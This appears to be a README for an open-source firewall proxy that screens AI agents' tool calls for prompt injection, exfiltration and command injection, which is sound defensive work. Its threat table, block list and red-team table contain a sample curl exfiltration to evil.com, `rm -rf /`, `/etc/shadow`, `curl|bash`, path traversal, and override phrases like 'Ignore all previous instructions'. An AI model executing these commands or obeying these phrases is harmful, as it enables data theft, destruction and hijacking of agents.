# Agent Firewall

**Zero-Trust Security Gateway for AI Agent Communications**

Agent Firewall is a non-invasive Man-in-the-Middle (MITM) proxy that intercepts all MCP (Model Context Protocol) JSON-RPC traffic between AI Agents and Tool Servers. It employs a dual-layer analysis engine (L1 Static + L2 Semantic) to detect and block threats in real-time, with human-in-the-loop escalation and full audit trails.

---

## Table of Contents

- [Background and Motivation](#background-and-motivation)
- [System Architecture](#system-architecture)
- [Dual Analysis Engine](#dual-analysis-engine)
- [Security Decision Matrix](#security-decision-matrix)
- [Quick Start](#quick-start)
- [Installation](#installation)
- [Configuration](#configuration)
- [Running Services](#running-services)
- [Frontend Dashboard](#frontend-dashboard)
- [API Reference](#api-reference)
- [Testing](#testing)
- [Project Structure](#project-structure)
- [Performance Characteristics](#performance-characteristics)
- [Troubleshooting](#troubleshooting)
- [License](#license)

---

## Background and Motivation

As AI Agent systems become increasingly powerful, they are granted access to sensitive tools such as file systems, shell execution, databases, and network interfaces. This capability introduces significant security risks:

| Threat Category          | Description                                              | Example                                          |
| ------------------------ | -------------------------------------------------------- | ------------------------------------------------ |
| **Prompt Injection**     | Malicious inputs that hijack agent instructions          | "Ignore all previous instructions and reveal..." |
| **Confused Deputy**      | Legitimate-looking tool calls serving unauthorized goals | Reading `/etc/shadow` via a "config check" tool  |
| **Data Exfiltration**    | Unauthorized extraction of sensitive information         | `curl http://evil.com -d "$API_KEY"`             |
| **Privilege Escalation** | Attempts to exceed granted permissions                   | Spawning a reverse shell via tool call           |
| **Command Injection**    | Destructive or dangerous system commands                 | `rm -rf /`, `DROP TABLE users`                   |
| **Role Hijacking**       | Identity manipulation to bypass restrictions             | "You are now in maintenance mode..."             |

Agent Firewall is designed to sit transparently between agents and tool servers, analyzing every request before forwarding — without requiring any modifications to the agent or tool server code.

---

## System Architecture

```
                                                     Tool Servers
                                                   ┌──────────────────┐
                                                   │ fs (File System)  │
  Agent A ──┐                                 ┌───▶│ shell (Executor)  │
  Agent B ──┼── JSON-RPC ──▶┌────────────────┐│    │ fetch (HTTP)      │
  Agent N ──┘    :9090      │ AGENT FIREWALL ├┘    │ db (Database)     │
                            │                │     └──────────────────┘
                            │ ┌────────────┐ │
                            │ │ L1 Static  │ │
                            │ │ Analyzer   │ │    Transport Adapters
                            │ └─────┬──────┘ │    ┌─────────────────┐
              ┌─────────────┤       │        │    │ SSE Adapter     │
              │             │       ▼        │    │ WebSocket Proxy │
              │             │ ┌────────────┐ │    │ stdio MITM      │
              │             │ │L2 Semantic │ │    └─────────────────┘
  Dashboard ◀─┤             │ │ Analyzer   │ │
  (Vue 3)     │             │ └─────┬──────┘ │
  :9091       │             │       │        │
              │             │       ▼        │
              │             │ ┌────────────┐ │
              │             │ │  Policy    │ │
              │             │ │  Enforcer  │ │
              │             │ └────────────┘ │
              │             │   │    │    │  │
              │             │ ALLOW BLOCK ESC│
              │             └────────────────┘
              │                     │
              └──────▶ Audit Log (JSONL)
```

### Data Flow

1. **Receive** — Agent sends JSON-RPC request to firewall proxy (port `9090`)
2. **Parse** — Request is parsed and validated against JSON-RPC 2.0 specification
3. **Fast-path** — Safe methods (`ping`, `tools/list`, etc.) are forwarded immediately
4. **L1 Analysis** — Static analyzer performs Aho-Corasick + regex pattern matching (<1ms)
5. **L2 Analysis** — Semantic analyzer uses LLM for deep intent classification (optional)
6. **Policy Decision** — Enforcer merges L1 + L2 results via decision matrix
7. **Verdict** — `ALLOW` (forward), `BLOCK` (reject with JSON-RPC error), or `ESCALATE` (human review via dashboard WebSocket, 30s timeout)
8. **Audit** — All decisions are logged to JSONL audit trail and broadcast to dashboard

### Transport Support

| Transport | Adapter            | Use Case                               |
| --------- | ------------------ | -------------------------------------- |
| SSE       | `SseAdapter`       | HTTP POST + Server-Sent Events streams |
| WebSocket | `WebSocketAdapter` | Bidirectional real-time MCP traffic    |
| stdio     | `StdioAdapter`     | Subprocess-based MCP server MITM       |

---

## Dual Analysis Engine

### L1 Static Analyzer

High-throughput, low-latency pattern-based threat detection. Operates synchronously and completes in **<1ms** for payloads up to 64KB.

#### Aho-Corasick Automaton

O(n) multi-pattern matching regardless of pattern count. Default dangerous fragments:

```
rm -rf, /etc/shadow, /etc/passwd, DROP TABLE, DELETE FROM,
TRUNCATE, shutdown, mkfs, dd if=, FORMAT C:, wget|sh, curl|bash
```

#### Regex Battery (9 patterns)

| Pattern Name              | Description                                   | Threat Level |
| ------------------------- | --------------------------------------------- | ------------ |
| `shell_pipe_injection`    | Shell command chaining via pipes or subshells | HIGH         |
| `prompt_injection_marker` | "Ignore previous instructions" variants       | CRITICAL     |
| `base64_obfuscation`      | Base64 decode function calls                  | HIGH         |
| `hex_obfuscation`         | Hex-encoded shell commands                    | MEDIUM       |
| `path_traversal`          | Directory traversal sequences (`../..`)       | HIGH         |
| `env_exfiltration`        | Access to sensitive environment variables     | CRITICAL     |
| `sql_injection`           | SQL injection patterns (`UNION SELECT`, etc.) | HIGH         |
| `data_exfiltration_url`   | Requests to known exfiltration endpoints      | HIGH         |
| `suspicious_blob`         | Large unreadable encoded payloads             | MEDIUM       |

#### Heuristic Base64 Decoding

The analyzer attempts to decode suspicious Base64 blobs and re-analyze the decoded content, catching obfuscated payloads that would otherwise evade detection.

### L2 Semantic Analyzer

Deep intent classification using LLM. Understands the **meaning** behind requests, catching sophisticated attacks that evade pattern matching.

#### Classifier Backends

| Backend          | Use Case     | Configuration                                                |
| ---------------- | ------------ | ------------------------------------------------------------ |
| `LlmClassifier`  | Production   | Any OpenAI-compatible API (OpenRouter, OpenAI, Ollama, vLLM) |
| `MockClassifier` | Testing / CI | 12 keyword heuristics, no external calls                     |

#### Fail-Open Semantics

If the LLM is unavailable or times out, L2 returns a "no opinion" result. The policy enforcer then relies on L1 results alone. This ensures **availability is never compromised** by model latency.

---

## Security Decision Matrix

The Policy Enforcer merges L1 and L2 analysis results:

| L1 Threat Level | L2 Injection | L2 Confidence | Verdict         |
| --------------- | ------------ | ------------- | --------------- |
| CRITICAL        | any          | any           | **BLOCK**       |
| HIGH            | True         | >= 0.7        | **BLOCK**       |
| HIGH            | True         | < 0.7         | **ESCALATE**    |
| HIGH            | False        | any           | **ESCALATE**    |
| MEDIUM          | True         | >= 0.8        | **BLOCK**       |
| MEDIUM          | True         | < 0.8         | **ESCALATE**    |
| MEDIUM          | False        | any           | ALLOW (audited) |
| LOW/NONE        | True         | >= 0.9        | **BLOCK**       |
| LOW/NONE        | True         | >= 0.7        | **ESCALATE**    |
| LOW/NONE        | False        | any           | ALLOW           |

### Verdict Definitions

- **ALLOW** — Request is forwarded to upstream MCP tool server
- **BLOCK** — Request is rejected with a JSON-RPC `-32001` error response
- **ESCALATE** — Request is held pending human review via dashboard (30s timeout, defaults to BLOCK)

### Method Classification

**Always-safe methods** (no analysis required):

```
initialize, initialized, ping, tools/list, resources/list,
resources/templates/list, prompts/list, logging/setLevel
```

**High-risk methods** (always trigger full L1 + L2):

```
tools/call, completion/complete, sampling/createMessage
```

---

## Quick Start

```bash
# 1. Navigate to the extension directory
cd extensions/agent-firewall

# 2. Create virtual environment and install dependencies
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt

# 3. Start the backend (port 9090)
make dev

# 4. In another terminal — start the frontend dashboard (port 9091)
cd frontend
npm install
npx vite --port 9091 --host

# 5. Open dashboard
open http://localhost:9091
```

The backend API runs on **http://localhost:9090** and the frontend dashboard on **http://localhost:9091**.

---

## Installation

### Prerequisites

| Requirement | Version | Purpose                  |
| ----------- | ------- | ------------------------ |
| Python      | >= 3.12 | Backend runtime          |
| Node.js     | >= 18   | Frontend dev server      |
| pip         | latest  | Python package manager   |
| npm         | latest  | Frontend package manager |

### Backend Setup

```bash
cd extensions/agent-firewall

# Create and activate virtual environment
python3 -m venv .venv
source .venv/bin/activate

# Install production dependencies
pip install -r requirements.txt

# Or install as editable package with dev dependencies
pip install -e ".[dev]"
```

### Frontend Setup

```bash
cd extensions/agent-firewall/frontend

# Install Node.js dependencies
npm install
```

### Python Dependencies

| Package        | Version    | Purpose                                   |
| -------------- | ---------- | ----------------------------------------- |
| fastapi        | >= 0.115.0 | HTTP/WebSocket API framework              |
| uvicorn        | >= 0.34.0  | ASGI server with hot-reload               |
| pydantic       | >= 2.10.0  | Data validation and serialization         |
| httpx          | >= 0.28.0  | Async HTTP client for LLM API calls       |
| ahocorasick-rs | >= 0.22.0  | Rust-backed Aho-Corasick pattern matching |
| orjson         | >= 3.10.0  | Fast JSON serialization (C extension)     |
| aiofiles       | >= 24.1.0  | Async file I/O for audit logging          |
| websockets     | >= 14.0    | WebSocket protocol support                |
| python-dotenv  | >= 1.0.0   | Environment variable loading from `.env`  |

### Frontend Dependencies

| Package            | Version | Purpose                     |
| ------------------ | ------- | --------------------------- |
| vue                | ^3.5.0  | Reactive UI framework       |
| vite               | ^6.0.0  | Frontend build tool         |
| @vitejs/plugin-vue | ^5.2.0  | Vue 3 SFC compilation       |
| typescript         | ^5.7.0  | Type checking               |
| vue-tsc            | ^2.2.0  | Vue TypeScript type checker |

---

## Configuration

### Environment Variables

All settings can be overridden via environment variables (12-factor methodology). Create a `.env` file in `extensions/agent-firewall/`:

```bash
# ── Network ──────────────────────────────────────────
AF_LISTEN_HOST=127.0.0.1        # Firewall proxy listen address
AF_LISTEN_PORT=9090              # Firewall proxy listen port

# ── Upstream MCP Server ──────────────────────────────
AF_UPSTREAM_HOST=127.0.0.1      # Target MCP server address
AF_UPSTREAM_PORT=3000            # Target MCP server port
AF_TRANSPORT_MODE=sse            # Transport: stdio | sse | websocket

# ── L1 Static Analyzer ──────────────────────────────
AF_L1_ENABLED=1                  # Enable L1 (1=on, 0=off)
AF_BLOCKED_COMMANDS="rm -rf,/etc/shadow,DROP TABLE"

# ── L2 Semantic Analyzer ────────────────────────────
AF_L2_ENABLED=1                  # Enable L2 (1=on, 0=off)
AF_L2_MODEL_ENDPOINT=https://openrouter.ai/api/v1/chat/completions
AF_L2_API_KEY=sk-or-v1-your-api-key
AF_L2_MODEL=minimax/minimax-m2.5
AF_L2_TIMEOUT=10.0              # Seconds before L2 timeout → fail-open

# ── Session Management ──────────────────────────────
AF_SESSION_BUFFER_SIZE=64        # Messages retained per session (ring buffer)
AF_SESSION_TTL=3600              # Session expiry in seconds

# ── Rate Limiting (Token Bucket) ────────────────────
AF_RATE_LIMIT_RPS=100            # Max requests per second
AF_RATE_LIMIT_BURST=200          # Burst capacity

# ── Audit ────────────────────────────────────────────
AF_AUDIT_LOG=./audit/firewall.jsonl
```

### Variable Reference

| Variable                 | Default                                         | Description                          |
| ------------------------ | ----------------------------------------------- | ------------------------------------ |
| `AF_LISTEN_HOST`         | `127.0.0.1`                                     | Firewall proxy listen address        |
| `AF_LISTEN_PORT`         | `9090`                                          | Firewall proxy listen port           |
| `AF_UPSTREAM_HOST`       | `127.0.0.1`                                     | Target MCP server address            |
| `AF_UPSTREAM_PORT`       | `3000`                                          | Target MCP server port               |
| `AF_TRANSPORT_MODE`      | `sse`                                           | MCP transport (stdio/sse/websocket)  |
| `AF_L1_ENABLED`          | `1`                                             | Enable L1 static analyzer            |
| `AF_L2_ENABLED`          | `1`                                             | Enable L2 semantic analyzer          |
| `AF_L2_MODEL_ENDPOINT`   | `https://openrouter.ai/api/v1/chat/completions` | LLM API endpoint (OpenAI-compatible) |
| `AF_L2_API_KEY`          | (empty)                                         | API key for LLM authentication       |
| `AF_L2_MODEL`            | `minimax/minimax-m2.5`                          | Model identifier for L2              |
| `AF_L2_TIMEOUT`          | `10.0`                                          | L2 analysis timeout (seconds)        |
| `AF_SESSION_BUFFER_SIZE` | `64`                                            | Ring buffer size per session         |
| `AF_SESSION_TTL`         | `3600`                                          | Session expiry (seconds)             |
| `AF_RATE_LIMIT_RPS`      | `100`                                           | Token bucket refill rate             |
| `AF_RATE_LIMIT_BURST`    | `200`                                           | Token bucket burst capacity          |
| `AF_AUDIT_LOG`           | `./audit/firewall.jsonl`                        | Audit log file path                  |

---

## Running Services

### Development Mode (Recommended)

Start both backend and frontend with hot-reload:

**Terminal 1 — Backend (FastAPI on port 9090):**

```bash
cd extensions/agent-firewall
source .venv/bin/activate
make dev
```

**Terminal 2 — Frontend (Vite on port 9091):**

```bash
cd extensions/agent-firewall/frontend
npx vite --port 9091 --host
```

### Production Mode

Multi-worker deployment:

```bash
# Backend with 4 workers
make run

# Frontend build
cd frontend && npm run build
# Serve the built files from dist/ with any static server
```

### Using Makefile

| Command        | Description                                       |
| -------------- | ------------------------------------------------- |
| `make install` | Install as editable package with dev dependencies |
| `make dev`     | Start backend with hot-reload (uvicorn --reload)  |
| `make run`     | Start production backend (4 workers)              |
| `make test`    | Run full test suite (pytest)                      |
| `make lint`    | Lint source code (ruff check)                     |
| `make fmt`     | Format source code (ruff format)                  |
| `make attack`  | Run red team attack simulation                    |

### Verification

```bash
# Backend health check
curl http://127.0.0.1:9090/health
# → {"status":"ok","service":"agent-firewall"}

# Stats endpoint
curl http://127.0.0.1:9090/api/stats
# → {"uptime_seconds": 42.5, "active_sessions": 0, "dashboard_clients": 1, "audit": {...}}

# Frontend
open http://localhost:9091
```

---

## Frontend Dashboard

The unified security console is a Vue 3 SPA providing 7 functional pages:

### Pages

| Page                  | Route Hash    | Description                                                                                                                                                           |
| --------------------- | ------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Dashboard**         | `#dashboard`  | Overview — stat cards, threat distribution chart, recent alerts, engine status, quick actions                                                                         |
| **Traffic Waterfall** | `#traffic`    | Real-time traffic monitoring — verdict/method/search filtering, auto-scroll, detail panel with Metadata/Analysis/Payload tabs, HITL escalation buttons                |
| **Rules Config**      | `#rules`      | Full rule management — Pattern rules (regex/literal), Method policies, Agent rules. CRUD with live regex testing, toggle switches, action badges                      |
| **Engine Settings**   | `#engine`     | L1/L2 engine configuration — network settings, blocked commands, L2 model endpoint/key/timeout, session and audit config                                              |
| **Rate Limit**        | `#rate-limit` | Token bucket configuration — slider controls, animated bucket visualization, impact scenario calculations                                                             |
| **Security Test Lab** | `#test`       | Attack/defense testing — 12 built-in payloads (injection, traversal, exfiltration, command), custom payload editor, batch run, pass/fail results with latency metrics |
| **Audit Log**         | `#audit`      | Security event history — table with verdict/threat/time filters, search, CSV export, detail drawer                                                                    |

### Architecture

```
App.vue (shell + router)
├── Sidebar.vue (7-section navigation + connection status)
├── Dashboard.vue
├── TrafficWaterfall.vue
├── RulesConfig.vue
├── EngineSettings.vue
├── RateLimitSettings.vue
├── SecurityTest.vue
└── AuditLog.vue
```

**State Management:**

- `composables.ts` — 7 Vue 3 composables: `useWebSocket()`, `useStats()`, `useConfig()`, `useRules()`, `useSecurityTest()`, `useAuditLog()`, `useNavigation()`
- WebSocket at `/ws/dashboard` for real-time events
- REST API polling for stats (every 5s)
- Hash-based routing with browser back/forward support

---

## API Reference

### Proxy Endpoints

| Method    | Path       | Description                                    |
| --------- | ---------- | ---------------------------------------------- |
| POST      | `/mcp/*`   | Proxy JSON-RPC requests to upstream MCP server |
| POST      | `/mcp`     | Proxy JSON-RPC (root path)                     |
| GET       | `/mcp/sse` | SSE stream proxy for MCP responses             |
| WebSocket | `/ws/mcp`  | Bidirectional WebSocket MCP proxy              |

### Management Endpoints

| Method    | Path                              | Description                                                          |
| --------- | --------------------------------- | -------------------------------------------------------------------- |
| GET       | `/health`                         | Service health check                                                 |
| GET       | `/api/stats`                      | Firewall statistics (uptime, sessions, audit counts)                 |
| GET       | `/api/audit`                      | Paginated audit log entries (`?limit=&offset=&verdict=&since=`)      |
| GET       | `/api/config`                     | Current firewall configuration                                       |
| PATCH     | `/api/config`                     | Update firewall configuration (partial)                              |
| GET       | `/api/rules`                      | All rules (pattern_rules, method_rules, agent_rules, default_action) |
| POST      | `/api/rules/patterns`             | Create pattern rule                                                  |
| PUT       | `/api/rules/patterns`             | Update pattern rule                                                  |
| DELETE    | `/api/rules/patterns/{id}`        | Delete pattern rule                                                  |
| POST      | `/api/rules/patterns/{id}/toggle` | Enable/disable pattern rule                                          |
| POST      | `/api/rules/default`              | Update default action for unmatched requests                         |
| POST      | `/api/test/analyze`               | Test a payload against the analysis engine                           |
| WebSocket | `/ws/dashboard`                   | Real-time event stream + human-in-the-loop verdicts                  |

### OpenAI-Compatible Proxy Endpoints

| Method | Path                   | Description                                                    |
| ------ | ---------------------- | -------------------------------------------------------------- |
| POST   | `/v1/chat/completions` | OpenAI-compatible chat completion proxy with security analysis |
| POST   | `/v1/responses`        | OpenAI responses endpoint proxy                                |

### Blocked Request Response

When a request is blocked, the agent receives a JSON-RPC error:

```json
{
  "jsonrpc": "2.0",
  "id": "req-123",
  "error": {
    "code": -32001,
    "message": "Request blocked by security policy",
    "data": {
      "threat_level": "CRITICAL",
      "matched_patterns": ["rm -rf", "prompt_injection_marker"],
      "l2_confidence": 0.95,
      "reasoning": "Classic prompt injection: override prior instructions"
    }
  }
}
```

### Dashboard WebSocket Protocol

The `/ws/dashboard` WebSocket provides:

**Server → Client (events):**

```json
{
  "event_type": "request_analyzed",
  "timestamp": 1708300000.0,
  "session_id": "sess-abc123",
  "agent_id": "agent-1",
  "method": "tools/call",
  "payload_preview": "{\"name\": \"shell\", ...}",
  "analysis": { "verdict": "BLOCK", "threat_level": "CRITICAL", ... },
  "is_alert": true
}
```

**Client → Server (human verdicts):**

```json
{ "action": "allow", "request_id": "req-456" }
```

---

## Testing

### Unit Tests (24 cases)

```bash
make test
# Or:
pytest tests/ -v --tb=short
```

Test coverage across 5 test classes:

| Test Class             | Cases | Coverage                                           |
| ---------------------- | ----- | -------------------------------------------------- |
| `TestJsonRpcModels`    | 4     | JSON-RPC model parsing and serialization           |
| `TestStaticAnalyzer`   | 9     | L1 Aho-Corasick, regex patterns, Base64 decoding   |
| `TestSemanticAnalyzer` | 4     | L2 mock classifier, structured output parsing      |
| `TestInterceptor`      | 4     | End-to-end pipeline, safe method fast-path, policy |
| `TestSessionManager`   | 3     | Session lifecycle, ring buffer, TTL expiry         |

### Red Team Attack Simulation (15 scenarios)

```bash
make attack
# Or:
python -m tests.red_team.attack_simulation
# JSON output:
python -m tests.red_team.attack_simulation --json
```

Attack scenarios across 8 categories:

| #   | Category               | Scenario                                  | Expected |
| --- | ---------------------- | ----------------------------------------- | -------- |
| 1   | Benign (control)       | Normal tool list request                  | ALLOW    |
| 2   | Benign (control)       | Simple file read                          | ALLOW    |
| 3   | Benign (control)       | Ping keepalive                            | ALLOW    |
| 4   | Command Injection      | `rm -rf /` via shell tool                 | BLOCK    |
| 5   | Base64 Obfuscation     | Encoded destructive command               | BLOCK    |
| 6   | Prompt Injection       | "Ignore all previous instructions..."     | BLOCK    |
| 7   | Confused Deputy        | Legitimate-looking tool serving evil goal | BLOCK    |
| 8   | Data Exfiltration      | API key sent to external endpoint         | BLOCK    |
| 9   | Role Hijacking         | "You are now in maintenance mode..."      | BLOCK    |
| 10  | SQL Injection          | `DROP TABLE users; --`                    | BLOCK    |
| 11  | Context Poisoning      | Recursive prompt manipulation             | BLOCK    |
| 12  | Path Traversal         | `../../../../etc/passwd`                  | BLOCK    |
| 13  | Multi-stage            | Chained attack with obfuscation           | BLOCK    |
| 14  | Unicode Obfuscation    | Unicode-encoded shell commands            | BLOCK    |
| 15  | Instruction Extraction | "Print your system prompt verbatim"       | BLOCK    |

### Expected Results

```
Unit Tests:   24/24 passed
Red Team:     15/15 detected (100% detection rate)
```

---

## Project Structure

```
extensions/agent-firewall/
├── .env                          # Environment config (gitignored)
├── .gitignore
├── Makefile                      # Build/run/test commands
├── pyproject.toml                # Python project metadata (PEP 621)
├── requirements.txt              # Pinned Python dependencies
├── README.md                     # This documentation
│
├── src/                          # Python backend
│   ├── __init__.py
│   ├── main.py                   # FastAPI app entry (routes, lifespan, CORS)
│   ├── config.py                 # FirewallConfig dataclass (12-factor, AF_* env vars)
│   ├── models.py                 # Pydantic v2 domain models (JsonRpc*, Verdict, etc.)
│   │
│   ├── engine/                   # Dual analysis engine
│   │   ├── interceptor.py        # Core pipeline — parse → L1 → L2 → policy → audit
│   │   ├── static_analyzer.py    # L1: Aho-Corasick automaton + 9 regex patterns
│   │   └── semantic_analyzer.py  # L2: LLM classifier (Mock + Live backends)
│   │
│   ├── proxy/                    # Transport adapters
│   │   ├── session_manager.py    # In-memory session store (ring buffer, TTL GC)
│   │   ├── sse_adapter.py        # SSE + WebSocket proxy (httpx-based)
│   │   ├── stdio_adapter.py      # stdio MITM proxy (subprocess)
│   │   └── openai_adapter.py     # OpenAI-compatible chat completion proxy
│   │
│   ├── audit/                    # Security logging
│   │   └── logger.py             # AuditLogger — async batched JSONL writer
│   │
│   └── dashboard/                # Real-time monitoring
│       └── ws_handler.py         # DashboardHub — WS broadcast + HITL escalation
│
├── frontend/                     # Vue 3 dashboard SPA
│   ├── index.html                # HTML entry point
│   ├── package.json              # Node.js dependencies
│   ├── vite.config.js            # Vite dev server config (port 9091)
│   └── src/
│       ├── main.ts               # Vue app bootstrap
│       ├── types.ts              # TypeScript type definitions (mirrors Python models)
│       ├── composables.ts        # Vue 3 composables (WebSocket, Stats, Config, etc.)
│       └── components/
│           ├── Sidebar.vue       # Navigation sidebar (7 sections)
│           ├── Dashboard.vue     # Overview — stats, threats, alerts, engine status
│           ├── TrafficWaterfall.vue  # Real-time traffic waterfall + detail panel
│           ├── RulesConfig.vue   # Pattern/Method/Agent rule CRUD management
│           ├── EngineSettings.vue    # L1/L2 engine + network + session config
│           ├── RateLimitSettings.vue # Token bucket config + visualization
│           ├── SecurityTest.vue  # Attack payload tester (12 built-in + custom)
│           └── AuditLog.vue      # Audit log viewer + CSV export
│
├── tests/
│   ├── test_firewall.py          # Unit tests (24 cases, 5 classes)
│   └── red_team/
│       └── attack_simulation.py  # Adversarial test scenarios (15 attacks)
│
└── audit/                        # Audit log output directory
    └── firewall.jsonl            # Runtime audit log (gitignored)
```

---

## Performance Characteristics

| Component             | Latency    | Notes                                 |
| --------------------- | ---------- | ------------------------------------- |
| L1 Static Analyzer    | < 1ms      | Payloads up to 64KB                   |
| L1 + L2 (Mock)        | < 2ms      | No network calls (CI/testing)         |
| L1 + L2 (Live LLM)    | 100ms – 5s | Depends on model and network          |
| Session Lookup        | O(1)       | Hash-based session map                |
| Audit Write           | Async      | Batched flush every 1s                |
| Safe Method Fast-path | < 0.1ms    | No analysis, direct forward           |
| Dashboard Broadcast   | Async      | Per-client bounded queue (256 events) |

Memory usage is O(1) per request. Payload data is not copied beyond the initial orjson parse. Session ring buffers cap at `AF_SESSION_BUFFER_SIZE` messages per session.

---

## Troubleshooting

### Port Already in Use

```bash
# Check what's using port 9090
lsof -ti :9090
# Kill it
lsof -ti :9090 | xargs kill -9
```

### Backend Won't Start

```bash
# Verify Python version
python3 --version  # Must be >= 3.12

# Verify virtual environment
source .venv/bin/activate
which python  # Should point to .venv/bin/python

# Reinstall dependencies
pip install -r requirements.txt
```

### Frontend Shows Blank Page

Ensure the backend is running on port 9090 first — the frontend connects to `<hostname>:9090` for API and WebSocket.

```bash
# Verify backend is healthy
curl http://127.0.0.1:9090/health

# Start frontend from the correct directory
cd extensions/agent-firewall/frontend
npx vite --port 9091 --host
```

### L2 Analyzer Not Working

- Set `AF_L2_ENABLED=1` in `.env`
- Provide a valid `AF_L2_API_KEY`
- Verify the endpoint with: `curl -H "Authorization: Bearer $AF_L2_API_KEY" $AF_L2_MODEL_ENDPOINT`
- Check L2 timeout: increase `AF_L2_TIMEOUT` if your model is slow

### Audit Log Not Writing

```bash
# Ensure the audit directory exists
mkdir -p audit

# Check the log path
echo $AF_AUDIT_LOG  # Default: ./audit/firewall.jsonl

# View recent entries
tail -f audit/firewall.jsonl | python3 -m json.tool
```

---

## License

MIT
